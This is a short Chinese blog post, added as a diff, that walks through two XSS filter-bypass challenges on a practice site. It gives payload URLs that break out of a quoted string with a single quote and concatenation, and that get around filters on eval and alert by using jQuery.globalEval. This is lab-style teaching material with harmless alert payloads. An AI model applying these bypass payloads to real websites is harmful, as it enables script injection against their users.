@@ -1,0 +1,65 @@
+---
+author: ww
+comments: true
+date: 2015-12-03 14:20:22+00:00
+layout: post
+link: http://www.gl6.cc/blog/xss-%e7%bb%95%e8%bf%87%e8%bf%87%e6%bb%a4%e7%9a%84%e7%ae%80%e5%8d%95%e4%be%8b%e5%ad%90.html
+slug: xss-%e7%bb%95%e8%bf%87%e8%bf%87%e6%bb%a4%e7%9a%84%e7%ae%80%e5%8d%95%e4%be%8b%e5%ad%90
+title: '[XSS] 绕过过滤的简单例子'
+wordpress_id: 330
+categories:
+- safe
+tags:
+- xss
+---
+
+1.
+http://xsst.sinaapp.com/example/test1-2.php?page=1
+本题限制，双引号被过滤， 均被过滤!
+
+ 
+
+    
+    <script>
+    function $(str){
+    	if(!/^#[^']+"[^"]+"\]/.test(str)){
+    		throw "error";
+    	}
+    }
+    </script>
+    <script name="对面的妹子，看过来，看过来，看过来...">
+    var page=$('#test a[href="1"]');
+    </script>
+
+
+双引号被过滤,无法闭合双引号,但是单引号是可以的,可以使用单引号闭合最前面的单引号,再%2b 连接字符串,
+
+    
+    http://xsst.sinaapp.com/example/test1-2.php?page=1%27%2balert(/xss/)%2b%27
+
+
+
+
+2.
+http://xsst.sinaapp.com/example/test1-2-3.php?page=1
+本题限制，双引号被过滤 , , eval, window, alert 均被过滤。
+
+ 
+
+    
+    <script src="../jq.js"></script>
+    <script name="对面的妹子，看过来，看过来，看过来...">
+    try{
+    	var page='1';jQuery.globalEval('a'+'lert'+'(/d/)');//';
+    	var b=document.cookie;
+    }catch(e){
+    
+    }
+    
+
+
+
+这里只是限制eval,alert,使用jquery的globaleval,执行用+号拼接的alert
+
+    
+    http://xsst.sinaapp.com/example/test1-2-3.php?page=1%27;jQuery.globalEval(%27a%27%2b%27lert%27%2b%27(/d/)%27);//
